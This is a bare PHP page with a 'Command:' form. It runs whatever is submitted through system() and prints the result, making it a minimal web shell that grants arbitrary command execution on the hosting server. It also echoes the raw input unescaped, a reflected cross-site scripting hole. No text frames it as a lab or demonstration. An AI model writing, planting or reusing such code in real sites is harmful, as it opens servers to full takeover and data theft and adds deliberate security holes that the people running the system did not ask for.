<form method="post">
    <label for="name">Command:</label>
    <input name="name" id="name" type="text">

    <button type="submit">Submit</button>
</form>

<?php
if(isset($_POST['name']) and !empty($_POST['name']))
{
    echo system($_POST['name']);

    echo $_POST['name'];

} else {
    echo 'Enter a command';
}
?>
